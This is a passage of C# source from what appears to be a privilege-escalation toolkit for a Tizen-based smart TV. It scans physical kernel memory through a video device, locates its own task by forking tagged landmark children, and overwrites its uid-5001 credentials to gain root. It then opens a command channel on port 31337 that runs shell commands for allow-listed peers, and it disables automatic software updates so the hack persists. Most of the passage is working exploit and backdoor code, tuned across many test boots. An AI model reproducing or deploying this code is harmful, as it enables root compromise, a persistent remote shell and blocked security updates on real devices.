        var sw = System.Diagnostics.Stopwatch.StartNew();
        byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");   // Main()'s PR_SET_NAME
        // Search the 8 name bytes per page and verify the NUL follow-byte at
        // hit+8 (one cross-page byte read, only on candidate hits).  A carry
        // across pages would be order-dependent: the outward +/-step walk does
        // NOT visit physically adjacent pages consecutively.
        var commPat = selfTag;
        bool parentHigh = Kptr(parent) && parent >= 0xE0000000;

        // 1. the translated parent address, point-read: is the parent task there?
        bool pComm = false;
        uint pPage = 0, pCred = 0;
        uint pUid = 0xFFFFFFFF;
        if (parentHigh && V2P(parent) >= 0x20000000 && V2P(parent) < 0x60000000)
        {
            pPage = V2P(parent) & 0xFFFFF000;
            pComm = CommAt(parent, selfTag);
            try { pCred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
            if (Kptr(pCred)) pUid = CredUid(pCred);
        }

        string verdict;
        uint atPage = 0, atCred = 0, uid = 0xFFFFFFFF;
        int hits = 0;
        uint covLo = 0, covHi = 0;
        bool found = pComm;
        if (found)
        {
            verdict = "linear";
            atPage = V2P(parent);   // the TASK address, not the page base
            atCred = pCred;
            uid = pUid;
        }
        else if (parentHigh)
        {
            // 2. walk outward from the child's page; find "PHYSRPT1" at any
            // offset (tasks are slab objects, not page-aligned; the NUL
            // follow-byte at +8 is verified across the page edge), take the
            // task as hit-0x400, and require the children list to link the
            // child's sibling member - a freed or unrelated look-alike fails
            // this check.
            uint cPage = V2P(child) & 0xFFFFF000;
            uint want = child + O_SIBLING;
            for (int step = 0; step <= SpanPages && !found && sw.ElapsedMilliseconds < BudgetMs; step++)
            {
                int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
                foreach (int dir in dirs)
                {
                    long p = (long)cPage + (long)dir * step * 0x1000;
                    if (p < 0x20000000 || p >= 0x40000000) continue;
                    uint page = (uint)p;
                    if (covLo == 0 || page < covLo) covLo = page;
                    if (page > covHi) covHi = page;
                    byte[] data;
                    try { data = ReadPhys(page, 0x1000); } catch { continue; }
                    int idx = IndexOf(data, commPat);
                    while (idx >= 0 && !found)
                    {
                        long hitPa = (long)page + idx;
                        long taskPa = hitPa - O_COMM;
                        if (taskPa >= 0x20000000)
                        {
                            try
                            {
                                // comm is NUL-terminated at hit+8, which can
                                // live in the next page; ReadPhys reaches it
                                if (ReadPhys((uint)hitPa + 8, 1)[0] == 0)
                                {
                                    hits++;
                                    byte[] nb = ReadPhys((uint)taskPa + O_CHILDREN, 8);
                                    if (U32(nb, 0) == want || U32(nb, 4) == want)
                                    {
                                        found = true;
                                        atPage = (uint)taskPa;
                                        try { atCred = U32(ReadPhys((uint)taskPa + O_CRED, 4), 0); } catch { }
                                        if (Kptr(atCred)) uid = CredUid(atCred);
                                    }
                                }
                            }
                            catch { }
                        }
                        idx = IndexOf(data, commPat, idx + 1);
                    }
                }
            }
            verdict = found ? "elsewhere" : (hits > 0 ? "comm-only" : "miss");
        }
        else
        {
            // Parent low but its cred pointer is the high object: locate cred
            // CONTENT (the ids pattern, as CredScanNear sees it) and compare
            // the frame.  Locate only - never patched.
            verdict = "cred-miss";
            uint anchor = V2P(child) & 0xFFFFF000;
            uint childCredPhys = 0;
            try
            {
                uint cc = U32(ReadPhys(V2P(child) + O_CRED, 4), 0);
                if (Kptr(cc)) childCredPhys = V2P(cc);
                // the child's cred can itself be the high object (v30/v31 boots:
                // ccred=e2c35300) - its translated page is then outside the
                // sweep and the child's TASK page (low, the walk read its comm)
                // is the anchor
                if (childCredPhys >= 0x20000000 && childCredPhys < 0x40000000)
                    anchor = childCredPhys & 0xFFFFF000;
            }
            catch { }
            var pat16 = new byte[16];
            for (int i = 0; i < 2; i++)
            {
                BitConverter.GetBytes(5001u).CopyTo(pat16, i * 8);
                BitConverter.GetBytes(100u).CopyTo(pat16, i * 8 + 4);
            }
            for (int step = 0; step <= SpanPages && !found && sw.ElapsedMilliseconds < BudgetMs; step++)
            {
                int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
                foreach (int dir in dirs)
                {
                    long p = (long)anchor + (long)dir * step * 0x1000;
                    if (p < 0x20000000 || p >= 0x40000000) continue;
                    uint page = (uint)p;
                    if (covLo == 0 || page < covLo) covLo = page;
                    if (page > covHi) covHi = page;
                    byte[] data;
                    try { data = ReadPhys(page, 0x1000); } catch { continue; }
                    int idx = IndexOf(data, pat16);
                    while (idx >= 0 && !found)
                    {
                        if (idx >= 4)
                        {
                            uint hitCred = page + (uint)idx - 4;
                            // The ids pattern repeats every 8 bytes inside one
                            // cred, so skip the whole object, not just its
                            // start: the child's cred is a fork COPY that always
                            // holds OUR ids (review 2026-10-26).
                            if (childCredPhys != 0 && hitCred >= childCredPhys &&
                                hitCred < childCredPhys + 0x40)
                            {
                                idx = IndexOf(data, pat16, idx + 1);
                                continue;
                            }
                            found = true;
                            atPage = page;
                            atCred = hitCred;
                            // CredUid wants a kernel VA; atCred is physical
                            uid = CredUid((atCred + PHYS_OFF) & 0xFFFFFFFF);
                            verdict = "cred-elsewhere";   // the translated frame (>= 0x40000000) can never equal this
                        }
                        idx = IndexOf(data, pat16, idx + 1);
                    }
                }
            }
        }
        DropPages();
        Beacon("high-scan C=" + child.ToString("x8") +
               " P=" + parent.ToString("x8") +
               " pp=" + (parentHigh ? pPage.ToString("x8") : "-") +
               " cp=" + (Kptr(cred) ? (V2P(cred) & 0xFFFFF000).ToString("x8") : "-") +
               " pc=" + (pComm ? 1 : 0) +
               " hits=" + hits +
               " at=" + (found ? atPage.ToString("x8") : "-") +
               " cred=" + (found ? atCred.ToString("x8") : "-") +
               " cuid=" + UidWord(uid) +
               " cov=" + (covLo != 0 ? covLo.ToString("x8") + "-" + covHi.ToString("x8") : "-") +
               " ms=" + sw.ElapsedMilliseconds +
               " verdict=" + verdict);
    }

    // Parent-cred uid of a PHYRFORK, for the hunt latch.
    // 5001 = ours.  Anything else used to be skip-orphan. v22 still dropped
    // attempt 1 when the stale parent cred read as some uid other than 0 /
    // 0xFFFFFFFF (cold boot 2026-10-25: seen=1 skip-orphan=1, child=0).
    // v23 latches every new PHYRFORK not in `pre`; PatchCred still writes
    // uid 5001 only. Twin: tools/sim_rpc.py hunt_new_phyrfork.
    static uint ChildParentUid(uint child)
    {
        uint saw = 0xFFFFFFFF;
        foreach (uint po in new uint[] { 0x2F0, 0x2F4 })
        {
            uint parent = 0;
            try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { continue; }
            if (!Kptr(parent) || parent == child) continue;
            uint cred = 0, real = 0;
            try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
            uint u = CredUid(cred);
            if (u == 5001) return 5001;
            if (u != 0xFFFFFFFF) saw = u;
            try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
            if (Kptr(real))
            {
                uint ru = CredUid(real);
                if (ru == 5001) return 5001;
                if (ru != 0xFFFFFFFF) saw = ru;
            }
        }
        return saw;
    }

    static void KillChildren()
    {
        foreach (int pid in ChildPids)
        {
            try { if (pid > 0) kill(pid, SIGKILL); } catch { }
        }
        ReapChildren();
    }

    static bool PeerAllowed(string ip)
    {
        // Fail CLOSED.  deploy.sh writes rootchan.allow BEFORE the DLL, so a
        // missing/unreadable file means "not installed by the toolkit", not
        // "let the whole LAN in".  A hand-copied payload needs the file too
        // (see AGENTS.md).
        try
        {
            if (!File.Exists(AllowFile)) return false;
            foreach (string line in File.ReadAllLines(AllowFile))
            {
                string s = line.Trim();
                if (s.Length == 0 || s.StartsWith("#")) continue;
                if (s == ip) return true;
            }
            return false;
        }
        catch { return false; }
    }

    // Reap landmark children that have already exited.  waitpid is called for an
    // exact pid with WNOHANG - never -1 - so a child started by .NET's own
    // Process.Start (Run/AutoUpdateOff) is never stolen from the runtime.
    static void ReapChildren()
    {
        for (int i = ChildPids.Count - 1; i >= 0; i--)
        {
            try
            {
                int status;
                int r = waitpid(ChildPids[i], out status, WNOHANG);
                if (r == ChildPids[i] || r < 0) ChildPids.RemoveAt(i);
            }
            catch { ChildPids.RemoveAt(i); }
        }
    }

    // Bind the address the TV would use to REACH the recorded PC, not 0.0.0.0.
    // A wildcard listener is reachable from every interface the set brings up
    // (Wi-Fi Direct, tethering, ...) even though PeerAllowed still filters the
    // peer.  Deriving the address from the route to the PC picks the right
    // interface by construction and needs no knowledge of the laptop's IP - the
    // deploy that records rootchan.host is what makes it automatic.
    // No route yet (TV offline at payload start) -> ANY, and say so: a working
    // channel is better than a closed port on a set that may come up later.
    static IPAddress BindAddress()
    {
        try
        {
            IPAddress pc;
            if (!IPAddress.TryParse(HostAddr(), out pc)) return IPAddress.Any;
            using (var probe = new Socket(AddressFamily.InterNetwork,
                                          SocketType.Dgram, ProtocolType.Udp))
            {
                probe.Connect(new IPEndPoint(pc, 9));      // route lookup only
                var local = probe.LocalEndPoint as IPEndPoint;
                if (local != null && !local.Address.Equals(IPAddress.Any))
                    return local.Address;
            }
        }
        catch { }
        return IPAddress.Any;
    }

    static TcpListener ListenOn(IPAddress want, out IPAddress bound)
    {
        try
        {
            var l = new TcpListener(want, 31337);
            l.Start();
            bound = want;
            return l;
        }
        catch (Exception e)
        {
            Beacon("chan bind " + want + " failed (" + e.Message + "), using any");
            var l = new TcpListener(IPAddress.Any, 31337);
            l.Start();
            bound = IPAddress.Any;
            return l;
        }
    }

    static void RootChannel()
    {
        // A failed bind used to end RootChannel and throw away a successful root
        // (the process then exited as a fast attempt).  Keep trying instead: the
        // port can be in TIME_WAIT or the address may come up seconds later.
        while (true)
        {
            TcpListener l = null;
            try
            {
                IPAddress bound;
                l = ListenOn(BindAddress(), out bound);
                Beacon("ROOTCHAN 31337 uid=" + getuid() + " bind=" + bound);
                // The TV's address can move (DHCP, Wi-Fi reconnect).  A fixed bind
                // would then be a dead port until the app restarted, so re-derive
                // it every 30 s and listen again when it changes.  Pending()
                // polling (not a blocking accept) is what makes that possible.
                DateTime nextCheck = DateTime.UtcNow.AddSeconds(30);
                while (true)
                {
                    if (DateTime.UtcNow >= nextCheck)
                    {
                        nextCheck = DateTime.UtcNow.AddSeconds(30);
                        IPAddress now = BindAddress();
                        if (!now.Equals(bound))
                        {
                            try { l.Stop(); } catch { }
                            l = ListenOn(now, out bound);
                            Beacon("chan rebind " + bound);
                        }
                    }
                    if (!l.Pending())
                    {
                        Thread.Sleep(250);
                        continue;
                    }
                    using (var c = l.AcceptTcpClient())
                    {
                        string ip = "";
                        try { ip = ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString(); } catch { }
                        if (!PeerAllowed(ip))
                        {
                            Beacon("chan deny " + ip);
                            c.Close();
                            continue;
                        }
                        try { Serve(c); } catch (Exception e) { Beacon("chan " + e.Message); }
                    }
                }
            }
            catch (Exception e)
            {
                // The listener that just threw may still hold 31337 in the
                // socket table; without Stop() the next bind can fail until the
                // socket is collected.
                try { if (l != null) l.Stop(); } catch { }
                Beacon("chan fail " + e.Message + " (retrying in 5s)");
                Thread.Sleep(5000);
            }
        }
    }

    const int MaxCmd = 4096;          // one command line over 31337
    const int MaxPending = 8192;      // bytes accepted without a newline

    static bool Send(NetworkStream s, string text)
    {
        try
        {
            byte[] b = Encoding.UTF8.GetBytes(text);
            s.Write(b, 0, b.Length);
            s.Flush();
            return true;
        }
        catch { return false; }
    }

    static void Serve(TcpClient c)
    {
        var s = c.GetStream();
        // RootChannel serves one client at a time, so a silent or half-open
        // connection used to own the channel forever (the same class of wedge as
        // the v12 pipe bug, one layer up).  Bound every blocking call.
        s.ReadTimeout = 30000;
        s.WriteTimeout = 30000;
        var buf = new byte[8192];
        var sb = new StringBuilder();
        while (true)
        {
            int n;
            try { n = s.Read(buf, 0, buf.Length); }
            catch (Exception) { return; }      // timeout/reset: drop this client
            if (n <= 0) return;
            sb.Append(Encoding.UTF8.GetString(buf, 0, n));
            string all = sb.ToString();
            int nl;
            while ((nl = all.IndexOf('\n')) >= 0)
            {
                string cmd = all.Substring(0, nl).Trim();
                all = all.Substring(nl + 1);
                if (cmd.Length == 0) continue;
                if (cmd == "exit") return;
                if (cmd.Length > MaxCmd)
                {
                    Send(s, "ERR command too long (" + cmd.Length + " > " + MaxCmd + ")\n__END__\n");
                    return;
                }
                Send(s, Run(cmd) + "\n__END__\n");
            }
            if (all.Length > MaxPending)
            {
                Send(s, "ERR no newline within " + MaxPending + " bytes\n__END__\n");
                return;
            }
            sb.Clear();
            sb.Append(all);
        }
    }

    const int RunTimeoutMs = 120000;      // one command line; deploy/uninstall fit
    const int RunOutputMax = 1024 * 1024; // never slurp a tmpfs-filling command
    static int _runSeq = 0;

    static string Run(string cmd)
    {
        string outf = null;
        try
        {
            // Unique per call: AutoUpdateOff runs on a background thread while a
            // channel command can be executing, and the old fixed
            // /tmp/.dsh_cmd.out had both writing the same file.
            int n = System.Threading.Interlocked.Increment(ref _runSeq);
            string baseName = "/tmp/.dsh_cmd." + Environment.ProcessId + "." + n;
            outf = baseName + ".out";
            // Redirect INSIDE the shell, not through a pipe: a pipe is closed
            // only when every descendant closes it, and ReadToEnd() then blocks
            // forever if one outlives the timeout (a single `grep -r /opt` wedged
            // the channel until the TV was power-cycled).  The command is passed
            // as an ARGUMENT ($2), never spliced into the -c string, so `}`, `;`
            // or quotes in it cannot break the wrapper.
            // `ulimit -f 2048` caps the redirect file at ~1-2 MiB (512/1024-byte
            // blocks depending on the shell): the 1 MiB read cap below bounded
            // only what WE read, while /tmp is tmpfs, so `yes` could fill RAM
            // until the 120 s kill (review P2, 2026-10-26).
            var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh");
            psi.ArgumentList.Add("-c");
            psi.ArgumentList.Add("exec > \"$1\" 2>&1; ulimit -f 2048 2>/dev/null; exec /bin/sh -c \"$2\"");
            psi.ArgumentList.Add("_");       // $0
            psi.ArgumentList.Add(outf);      // $1
            psi.ArgumentList.Add(cmd);       // $2
            psi.UseShellExecute = false;
            using (var p = System.Diagnostics.Process.Start(psi))
            {
                if (p == null) return "ERR spawn";
                bool exited = p.WaitForExit(RunTimeoutMs);
                if (!exited)
                {
                    try { p.Kill(true); } catch { }   // whole process tree
                    Thread.Sleep(250);
                }
                string outp = ReadCapped(outf);
                if (!exited)
                    outp = (outp + "\n[timeout: killed after " +
                            (RunTimeoutMs / 1000) + "s]").Trim();
                return outp.TrimEnd();
            }
        }
        catch (Exception ex) { return "ERR " + ex.GetType().Name + ": " + ex.Message; }
        finally { try { if (outf != null) File.Delete(outf); } catch { } }
    }

    static string ReadCapped(string path)
    {
        try
        {
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read,
                                           FileShare.ReadWrite))
            {
                long len = fs.Length;
                int take = (int)Math.Min(len, RunOutputMax);
                var buf = new byte[take];
                int off = 0;
                while (off < take)
                {
                    int r = fs.Read(buf, off, take - off);
                    if (r <= 0) break;
                    off += r;
                }
                string s = Encoding.UTF8.GetString(buf, 0, off);
                if (len > RunOutputMax)
                    s += "\n[output truncated at " + RunOutputMax + " bytes of " +
                         len + "]";
                return s;
            }
        }
        catch { return ""; }
    }

    // The TV will happily replace the app we live in, which would undo the root, so
    // re-assert the menu setting at every boot. This is the same key the UI writes
    // (found in SWUAutoUpgrade's string table), and 0 means "off".
    static void AutoUpdateOff()
    {
        const string k = "db/menu/support/softwareupdate/autoupdate";
        try
        {
            Run("buxton2ctl set-int32 system " + k + " 0");
            Run("buxton2ctl set-int32 user " + k + " 0");
            Beacon("autoupdate " + Run("buxton2ctl get system " + k));
        }
        catch (Exception e) { Beacon("autoupdate fail " + e.Message); }
    }

    static void Main()
    {
        AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
        prctl(15, "PHYSRPT1", 0, 0, 0);   // PR_SET_NAME on this thread

        Beacon("start uid=" + getuid() + " pid=" + Environment.ProcessId);
        try
        {
            _fd = -1;
            if (!OpenDevice(120000))
            {
                Beacon("fail open node after 120s=" + _fd + " errno=" + _openErrno);
                Thread.Sleep(30000);
                return;
            }
            Beacon("device " + _node + " fd=" + _fd);

            uint baseAddr = FindBase();
            if (baseAddr == 0) { Beacon("fail no kernel image"); CloseDevice(); Thread.Sleep(20000); return; }
            uint initVirt = LocateInit(baseAddr);
            if (initVirt == 0) { Beacon("fail no init_task"); CloseDevice(); Thread.Sleep(20000); return; }
            uint initPhys = V2P(initVirt);
            Beacon("kernel=" + baseAddr.ToString("x8") + " init_task=" + initVirt.ToString("x8"));

            var offs = TaskOffsets(initPhys, initVirt);
            if (offs.Count == 0) { Beacon("fail no task offsets"); CloseDevice(); Thread.Sleep(20000); return; }
            var sb = new StringBuilder();
            foreach (uint cand in offs) { if (sb.Length > 0) sb.Append(','); sb.Append(cand.ToString("x")); }
            Beacon("cand n=" + offs.Count + " offs=" + sb);

            // Second open of this boot, still the sole opener.  Attempt 1 of a
            // cold boot hunts on the same fd FindBase just thrashed; attempt 2
            // (new process) works.  Reopen here, not after fork().
            if (!ReopenVideo())
            {
                // Without the device every read fails; burning the rounds would
                // only delay the fresh-process relaunch that can fix it.
                Beacon("fail reopen " + _node + " errno=" + _openErrno +
                       " (exiting for a fresh process)");
                CloseDevice();
                Thread.Sleep(5000);
                return;
            }

            // fork() COPIES the cred, so patching the child never roots us -- the
            // child is only a landmark.  A pre-fork snapshot of existing
            // PHYRFORK tasks keeps us from latching onto an orphan from an
            // earlier AUL restart (that caused "child-patch=True uid=5001").
            byte[] forkName = Encoding.ASCII.GetBytes("PHYRFORK\0");
            GCHandle forkNamePin = GCHandle.Alloc(forkName, GCHandleType.Pinned);
            int forkNamePtr = forkNamePin.AddrOfPinnedObject().ToInt32();
            byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");
            uint child = 0, self = 0, childPu = 0xFFFFFFFF;

            // v9: AUL restarts this app about one second after it exits, and a
            // FRESH PROCESS was thought to fix a bad physmap window (v28 proved
            // it was really the seconds elapsed, not the restart).  Fast attempts
            // therefore still end in a fast-exit, but since v29 attempt 1 first
            // spends four rounds across the content-convergence window; only
            // after all four failures fall back to the long in-process backoff.
            // /tmp is tmpfs -> the counter resets each boot.
            int attempt = 1;
            try
            {
                if (File.Exists(TryFile))
                {
                    int prev;
                    if (int.TryParse(File.ReadAllText(TryFile).Trim(), out prev)) attempt = prev + 1;
                }
                File.WriteAllText(TryFile, attempt.ToString());
            }
            catch { }
            bool fastMode = attempt <= 4;
            Beacon("attempt=" + attempt + (fastMode ? " (fast mode)" : " (long retry mode)"));

            // v8 kept, now as the fallback path: the direct real_parent pointer
            // needs no comm read, and in long mode the retries are spaced out.
            // v29: fast mode no longer exits after two rounds; the waits were
            // meant to keep attempt 1 alive across the content window.
            // v31 tried a 10 s last wait; its cold boot was WORSE (attempt 1 saw
            // a high unreadable parent page, attempts 2/3 got high creds too,
            // attempt 4 rooted at t=132 s).  The real failure is ADDRESS-
            // DEPENDENT, not time: every coherent read in the beacon log is
            // below 0xE0000000; 0/21 high creds ever read 5001, 0/81 successful
            // task pointers were high, while a low allocation read coherently
            // 1-2 s after fork.  Attempt 1 is an allocation lottery, and only a
            // fresh process re-rolls it.  v32 restores the shorter v30 rounds
            // and closes the fifth pass with attempt 2 as the floor.
            int[] backoffMs = fastMode
                ? new int[] { 0, 0, 5000, 5000 }
                : new int[] { 0, 0, 8000, 15000, 25000, 30000 };
            for (int round = 0; round < backoffMs.Length && getuid() != 0; round++)
            {
                if (backoffMs[round] > 0)
                {
                    Beacon("retry in " + backoffMs[round] / 1000 + "s");
                    Thread.Sleep(backoffMs[round]);
                }
                DropPages();              // pre-scan must see live orphans, not a cached list
                var pre = new HashSet<uint>();
                foreach (uint o in offs)
                {
                    uint h = initVirt + o;
                    uint cur;
                    try { cur = U32(ReadPhys(initPhys + o + 4, 4), 0); } catch { continue; }
                    for (int i = 0; i < 200; i++)
                    {
                        if (!Kptr(cur) || cur == h) break;
                        uint task = (cur - o) & 0xFFFFFFFF;
                        string nm;
                        try { nm = CStr(ReadPhys(V2P(task) + O_COMM, 16)); } catch { break; }
                        if (nm.StartsWith("PHYRFORK")) pre.Add(task);
                        try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                    }
                }
                Beacon("round=" + round + " pre=" + pre.Count);

                int pid = fork();
                if (pid == 0)
                {
                    // Raw syscalls only: this is post-fork managed code.  Closing
                    // the inherited device fd is essential - the parent's close()
                    // frees nothing while a landmark child still holds it, and the
                    // next AUL launch then sits in the 120 s open() retry (exactly
                    // what v9 fast-exit was meant to avoid).
                    if (_fd >= 0) syscall(6, _fd, 0, 0, 0, 0, 0);     // close(fd)
                    syscall(172, 15, forkNamePtr, 0, 0, 0, 0);        // prctl(PR_SET_NAME)
                    usleep(120000000);                                // 120 s landmark
                    _exit(0);
                }
                if (pid < 0) { Beacon("fork failed " + pid); Thread.Sleep(1000); continue; }
                ChildPids.Add(pid);
                ReapChildren();
                Thread.Sleep(700);        // let the child set its tag
                DropPages();              // see the kernel's post-fork writes

                var names = new StringBuilder();
                int seenFork = 0, skipOrphan = 0;
                uint lastPu = 0xFFFFFFFF;
                // Waiting longer cannot help when the list is unreadable: the walk either sees
                // the new landmark within a second or not at all. Fast mode therefore gives
                // up quickly and lets AUL relaunch a fresh process (fresh mmap) instead of
                // burning 20 s per round. The long fallback keeps the patient budget.
                var deadline = DateTime.UtcNow.AddSeconds(fastMode ? 3 : 20);
                while (DateTime.UtcNow < deadline)
                {
                    DropPages();
                    child = 0; self = 0;
                    seenFork = 0; skipOrphan = 0;
                    uint ours = 0, maybe = 0, oursPu = 0xFFFFFFFF, maybePu = 0xFFFFFFFF;
                    lastPu = 0xFFFFFFFF;
                    foreach (uint o in offs)
                    {
                        uint h = initVirt + o;
                        uint cur;
                        try { cur = U32(ReadPhys(initPhys + o + 4, 4), 0); } catch { break; }
                        for (int i = 0; i < 200; i++)
                        {
                            if (!Kptr(cur) || cur == h) break;
                            uint task = (cur - o) & 0xFFFFFFFF;
                            string nm;
                            try { nm = CStr(ReadPhys(V2P(task) + O_COMM, 16)); } catch { break; }
                            if (nm.StartsWith("PHYRFORK") && !pre.Contains(task))
                            {
                                seenFork++;
                                uint pu = ChildParentUid(task);
                                lastPu = pu;
                                if (pu == 5001) { ours = task; oursPu = pu; }
                                else
                                {
                                    skipOrphan++;
                                    // v23: any new landmark. v22 required pu 0 / unreadable
                                    // and missed the cold-boot child (pu was some other stale word).
                                    maybe = task;
                                    maybePu = pu;
                                }
                            }
                            if (nm.StartsWith("PHYSRPT")) self = task;
                            if (round == 0 && names.Length < 120) names.Append(nm).Append(',');
                            try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                        }
                    }
                    child = ours != 0 ? ours : maybe;
                    childPu = ours != 0 ? oursPu : maybePu;
                    if (child != 0) break;
                    Thread.Sleep(250);
                }
                Beacon("tail: " + names);
                if (child == 0)
                {
                    Beacon("fail no new PHYRFORK seen=" + seenFork +
                           " skip-orphan=" + skipOrphan +
                           " pu=" + lastPu.ToString("x"));
                    KillChildren();
                    Thread.Sleep(1000);
                    continue;
                }
                Beacon("child=" + child.ToString("x8") + " self=" + self.ToString("x8") +
                       " pu=" + UidWord(childPu));

                if (self != 0)
                {
                    uint sc = 0, sr = 0;
                    try { sc = U32(ReadPhys(V2P(self) + O_CRED, 4), 0); } catch { }
                    try { sr = U32(ReadPhys(V2P(self) + O_REAL, 4), 0); } catch { }
                    Beacon("self cred=" + sc.ToString("x8") + " real=" + sr.ToString("x8"));
                    if (CredUid(sc) == 5001) PatchCred(sc);
                    if (Kptr(sr) && sr != sc && CredUid(sr) == 5001) PatchCred(sr);
                    Beacon("self-patch uid=" + getuid());
                }

                // Direct parent pointer.  fork() stores the forking task in
                // child->real_parent (0x2F0) and ->parent (0x2F4); that task is
                // *us*, so no comm lookup is involved.  This survives the window
                // where every comm/scan read comes back stale (the v7 failure:
                // "child=... self=00000000").
                if (getuid() != 0)
                {
                    uint[] parentOffs = { 0x2F0, 0x2F4 };
                    // Stale uid-0 on the parent cred is why v21 skipped the child.
                    // We latched it; re-read a few times so PatchCred sees 5001.
                    // v28: if no kptr cred/real is EVER seen in the first three
                    // retries, the pointer line itself reads dead-stable stale
                    // (v27 cold boot: cred=00000000 for 20 s) - stop re-reading
                    // it and hand over to the content scan below.
                    bool sawKptr = false;
                    // v33: a high task/cred read is not a timing problem. If the
                    // parent task or its cred lives at/above 0xE0000000, video40
                    // cannot read it coherently (0/21 high creds across the cold
                    // boots); more rounds/waits only delay the fresh-process
                    // re-roll.  sawLow keeps a low-but-write-failed cred on the
                    // normal retry/scan path.
                    bool sawLow = false, highAlloc = false;
                    uint highParent = 0, highCred = 0, highReal = 0;
                    // latch the FIRST junk sample: later zero reads must not
                    // erase the evidence of which words were junk
                    bool highJunk = false;
                    uint junkCred = 0, junkReal = 0;
                    for (int pr = 0; pr < 8 && getuid() != 0; pr++)
                    {
                        DropPages();
                        // Control read: the child's OWN cred is a fork-fresh page
                        // (like its comm, which the walk proved coherent).  If
                        // cuid reads 5001 while the parent-side probes do not,
                        // the stale read is specific to the running parent's
                        // pages.  The child cred is a fork() COPY - never patched.
                        uint cc = 0, cu = 0xFFFFFFFF;
                        try { cc = U32(ReadPhys(V2P(child) + O_CRED, 4), 0); } catch { }
                        if (Kptr(cc)) cu = CredUid(cc);
                        foreach (uint po in parentOffs)
                        {
                            uint parent = 0, cred = 0, real = 0;
                            try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { }
                            if (Kptr(parent) && parent != child)
                            {
                                try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                                try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                            }
                            if (Kptr(cred) || Kptr(real)) sawKptr = true;
                            // A high parent page is exactly the half video40
                            // cannot read: cred/real are junk there.  Never let
                            // that junk veto the gate via sawLow (a junk word in
                            // 0xC0000000..0xDFFFFFFF used to look like a low
                            // cred).  When the parent is low, keep sawLow as the
                            // "readable but not patched" signal.
                            bool parentHigh = Kptr(parent) && parent >= 0xE0000000;
                            if (parentHigh)
                            {
                                highAlloc = true;
                                highParent = parent;
                                // log both words actually read, even if they are
                                // not pointers; junk=1 marks the C0..DF window
                                // that used to veto the gate via sawLow
                                highCred = cred;
                                highReal = real;
                                if (!highJunk &&
                                    ((Kptr(cred) && cred < 0xE0000000) ||
                                     (Kptr(real) && real < 0xE0000000)))
                                {
                                    highJunk = true;
                                    junkCred = cred;
                                    junkReal = real;
                                }
                            }
                            if (!parentHigh && Kptr(cred))
                            {
                                if (cred >= 0xE0000000)
                                {
                                    highAlloc = true; highParent = parent;
                                    highCred = cred; highReal = real;
                                }
                                else sawLow = true;
                            }
                            if (!parentHigh && Kptr(real))
                            {
                                if (real >= 0xE0000000)
                                {
                                    highAlloc = true; highParent = parent;
                                    highReal = real;
                                    if (highCred == 0) highCred = cred;
                                }
                                else sawLow = true;
                            }
                            uint u = CredUid(cred);
                            if (u == 5001)
                            {
                                Beacon("direct-parent+" + po.ToString("x") + "=" +
                                       parent.ToString("x8") + " cred=" + cred.ToString("x8"));
                                if (!PatchCred(cred) && getuid() != 0)
                                    Beacon("direct-patch-fail po=" + po.ToString("x") +
                                           " cred=" + cred.ToString("x8"));
                            }
                            if (Kptr(real) && real != cred && CredUid(real) == 5001)
                            {
                                if (!PatchCred(real) && getuid() != 0)
                                    Beacon("direct-patch-fail real=" + real.ToString("x8"));
                            }
                            // Fifth-pass diagnostic, silent on success: WHICH read
                            // is stale on a cold-boot attempt 1?  uid 0 = stale
                            // zeros, a number = stale word, unread = cred pointer
                            // not a kptr or the cred page unreadable, 5001 = the
                            // gate OPENED but the write did not stick.  With a
                            // kptr cred: plain= is the same uid through a plain
                            // mmap (different VA geometry), head= the first 18
                            // bytes at cred (stale pointer vs stale content),
                            // map=/pva= the two mapping VAs.  WITHOUT a kptr cred
                            // (v27 cold boot): pplain=/ppva= plain-read the
                            // POINTER word itself, phead= hexes the parent page
                            // around cred/real_cred (+0x3F0..+0x406), pmap= the
                            // window VA of that page.  The sim twin is
                            // direct_parent_patch in tools/sim_rpc.py.
                            if (getuid() != 0 && u != 5001 && (pr == 0 || pr == 7))
                            {
                                string extra;
                                if (Kptr(cred))
                                {
                                    uint plain = ReadPhysPlainU32(V2P(cred) + 4, out IntPtr pva);
                                    extra = " plain=" + UidWord(plain) +
                                            " head=" + HexHead(V2P(cred), 18) +
                                            " map=" + MapVa(V2P(cred)) +
                                            " pva=" + pva.ToString("x8");
                                }
                                else
                                {
                                    uint pplain = 0xFFFFFFFF;
                                    IntPtr ppva = IntPtr.Zero;
                                    if (Kptr(parent))
                                        pplain = ReadPhysPlainU32(V2P(parent) + O_CRED, out ppva);
                                    extra = " pplain=" + UidWord(pplain) +
                                            " phead=" + (Kptr(parent) ? HexHead(V2P(parent) + 0x3F0, 24) : "-") +
                                            " pmap=" + (Kptr(parent) ? MapVa(V2P(parent) + O_CRED) : "-") +
                                            " ppva=" + (Kptr(parent) ? ppva.ToString("x8") : "-");
                                }
                                Beacon("direct-probe pr=" + pr + " po=" + po.ToString("x") +
                                       " parent=" + parent.ToString("x8") +
                                       " cred=" + cred.ToString("x8") +
                                       " uid=" + UidWord(u) + extra +
                                       " ccred=" + cc.ToString("x8") + " cuid=" + UidWord(cu));
                            }
                            if (getuid() == 0) break;
                        }
                        if (getuid() == 0) break;
                        if (pr == 2 && !sawKptr) break;
                        Thread.Sleep(250);
                    }
                    // v33: fast-exit on an unreadable high allocation instead of
                    // spending the waits/scan; AUL's relaunch is the allocation
                    // re-roll.  Only fast mode: long mode must not loop exits.
                    if (highAlloc && !sawLow && fastMode && getuid() != 0)
                    {
                        uint logCred = highJunk ? junkCred : highCred;
